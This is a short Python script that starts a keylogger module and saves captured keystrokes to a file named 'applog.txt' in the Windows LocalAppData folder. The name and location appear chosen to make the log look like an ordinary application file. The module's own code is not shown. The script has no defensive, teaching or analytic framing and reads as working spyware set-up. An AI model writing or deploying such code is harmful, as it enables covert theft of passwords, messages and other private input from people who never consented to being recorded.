import os
from modules import keylogger

# do not change these
log_dir = os.environ['localappdata']
log_name = 'applog.txt'

keylogger.get_keystrokes(log_dir, log_name)